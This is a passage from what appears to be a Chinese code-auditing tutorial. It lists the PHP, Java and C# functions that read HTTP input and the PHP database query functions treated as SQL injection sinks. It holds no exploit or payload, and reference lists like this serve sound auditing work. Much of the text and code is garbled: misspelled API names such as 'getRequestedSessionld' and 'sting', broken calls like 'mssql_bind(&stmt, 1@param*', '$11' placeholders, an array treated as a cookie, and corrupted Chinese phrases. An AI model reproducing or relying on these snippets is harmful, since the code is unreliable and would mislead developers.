&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$HTTP_POST_VARS&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;：一个关联数组，包含&lt;span class=&#34;token variable&#34;&gt;$_GET&lt;/span&gt;、$ &lt;span class=&#34;token constant&#34;&gt;POST&lt;/span&gt;和&lt;span class=&#34;token variable&#34;&gt;$_&lt;/span&gt;（：&lt;span class=&#34;token number&#34;&gt;001&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;^&lt;/span&gt;的内容。
&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_COOKIE&lt;/span&gt;：一个关联数组，存放通过&lt;span class=&#34;token constant&#34;&gt;HTTP&lt;/span&gt; cookie传递给当前脚本的变量。
&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$HTTP_COOKIE_VARS&lt;/span&gt;：与&lt;span class=&#34;token variable&#34;&gt;$_COOKIE&lt;/span&gt;相同，在&lt;span class=&#34;token constant&#34;&gt;PHP&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4.1&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt; 中已弃用。
&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$HTTP_COOKIE_VARS&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;：服务器及执行环境的信息。
&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$HTTP_SERVER_VARS&lt;/span&gt;：与&lt;span class=&#34;token variable&#34;&gt;$_SERVER&lt;/span&gt; 相同，在&lt;span class=&#34;token constant&#34;&gt;PHP&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;4.1&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;.0&lt;/span&gt; 中已弃用。
&lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$HTTP_SERVER_VARS&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token string single-quoted-string&#34;&gt;&#39;name&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;php.ini中&lt;code&gt;register_globals=On&lt;/code&gt;时，将EGPCS（Environment、GET、POST、Cookie、Server）注册成全局变量，已被遗弃并且处于Off状态。&lt;/p&gt;
&lt;h5 id=&#34;JAVA中HTTP函数&#34;&gt;&lt;a href=&#34;#JAVA中HTTP函数&#34; class=&#34;headerlink&#34; title=&#34;JAVA中HTTP函数&#34;&gt;&lt;/a&gt;JAVA中HTTP函数&lt;/h5&gt;&lt;p&gt;HTTP请求对象的类名和接口名称是&lt;code&gt;HTTPServletRequest&lt;/code&gt;,引用是写成&lt;code&gt;javax.servlet.HttpServletRequest&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-java&#34; data-language=&#34;java&#34;&gt;&lt;code class=&#34;language-java&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;//getParameter()	返回所请求的给定参数的值&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; string_variable &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getParameter&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//getParameterValues()	以一个数组的方式返回给定参数请求的所有值&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; string_array &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getParameterValues&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//getQueryString()	返回请求的查询字符串&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; string_variable &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getQueryString&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//getHeaders()	返回所请求的头的值&lt;/span&gt;
sting string_variable &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getHeader&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;User-Agent&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//getHeaders()	以一个字符串对象的枚举返回请求头&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;Enumeration&lt;/span&gt; enumeration_object &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getHeaders&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;User-Agent&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//getRequestedSessionld()	返回客户端指定的 Session ID&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; string_variable &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getRequestedSessionld&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//getCookies()	返回一个cookie对象的数组&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;Cookie&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Cookie_array&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; request&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getCookies&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//cookie.getValue()	返回所请求的给定cookie的值&lt;/span&gt;
&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; string_variale &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Cookie_array&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getValue&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;C-中HTTP函数&#34;&gt;&lt;a href=&#34;#C-中HTTP函数&#34; class=&#34;headerlink&#34; title=&#34;C#中HTTP函数&#34;&gt;&lt;/a&gt;C#中HTTP函数&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-C#&#34; data-language=&#34;C#&#34;&gt;&lt;code class=&#34;language-C#&#34;&gt;//HttpCookieCollection	所有 cookie 的集合
HttpCookieCollection variable = Request.Cookies;
//Form―所有表单值的集合
string variable = Request.Form[&#34;name&#34;];
//Headers	所有头的集合
string variable = Request.Headers[&#34;name&#34;];
//Params 所有查询字符串、表单、cookie和服务器变量的组合集
string variable = Request.Params[&#34;name&#34;];
//Querystring	所有查询字符串项的集合
string variable = Request.Querystring[&#34;name&#34;];
//Servervariable	所有Web服务器变量的集合
string variable = Request.Servervariables[&#34;name&#34;];
//Url	返回一个URI类型的对象，其Query属性包含了 URI中的信息，比如?foo=bar
Uri object_variable = Request.Url;
string variable = object_variable.Query;
//UserAgent	包含浏览器的用户代理头
string variable = Request.UserAgent;
//UserHostAddress	包含客户端的远程IP地址
string variable = Request.UserHostAddress;
//UserHostName	 含客户端的远程主机名
string variable = Request.UserHostName;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;危险的函数&#34;&gt;&lt;a href=&#34;#危险的函数&#34; class=&#34;headerlink&#34; title=&#34;危险的函数&#34;&gt;&lt;/a&gt;危险的函数&lt;/h4&gt;&lt;h5 id=&#34;PHP&#34;&gt;&lt;a href=&#34;#PHP&#34; class=&#34;headerlink&#34; title=&#34;PHP&#34;&gt;&lt;/a&gt;PHP&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-php&#34; data-language=&#34;php&#34;&gt;&lt;code class=&#34;language-php&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;//mssql_query ()	向当前使用的数据库发送一个查询&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mssql_query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//mysql_query ()	向当前使用的数据库发送一个查询&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mysql_query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//mysql_db_query ()	选择一个数据库，在该数据库上执行一个查询&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mysql_db_query&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$dbf&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//oci_parse ()	在语句执行之前对其进行解析&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$stmt&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;oci_parse&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$connection&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;ociexecute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$stmt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//ora_parse ()	在语句执行之前对其进行解析&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;ora_parse&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$cursorr&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;ora_exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$cursor&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;}&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//mssql_bind ()	向存储过程添加一个参数&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;mssql_bind&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;stmt&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;@param&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$variable&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;SQLVARCHAR&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token constant boolean&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;100&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;mssql_execute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$stmt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//odbc_prepare ()	准备一条执行语句&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$stmt&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;odbc_prepare&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$db&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;odbc_execute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$stmt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//odbc_ exec ()	准备并执行一条SQL语句&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;odbc_exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$db&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//pg_query一执行一个查询(曾称为pg_exec)&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;pg_query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//pg_exec—*¥兼容性原因依然可用，但建议用户使用新的函数名&lt;/span&gt;
&lt;span class=&#34;token variable&#34;&gt;$result&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;pg_exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;pg_send_query—发送—异步查询	乙
&lt;span class=&#34;token function&#34;&gt;pg_send_query&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//pg_send_query_params一向服务器提交一个命令并分离参数，无须等待结果&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;pg_send_query_params&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//pg_query_params一向服务器提交一个命令并等待结果&lt;/span&gt;
&lt;span class=&#34;token function&#34;&gt;pg_query_params&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$sql&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//pg_send_prepare一发送一个请求以创建一条具有指定参数的预备语句，无须等待完成&lt;/span&gt;
pg &lt;span class=&#34;token function&#34;&gt;send_prepare&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;my_query&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;SELECT&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token constant&#34;&gt;FROM&lt;/span&gt; table &lt;span class=&#34;token constant&#34;&gt;WHERE&lt;/span&gt; field &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$11&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;pg_send_execute&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token variable&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string double-quoted-string&#34;&gt;&#34;my_query&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token variable&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;//pg_pr epare—S送一个请求以劄建一条具有指定参数的预备语句并等待完成&lt;/span&gt;
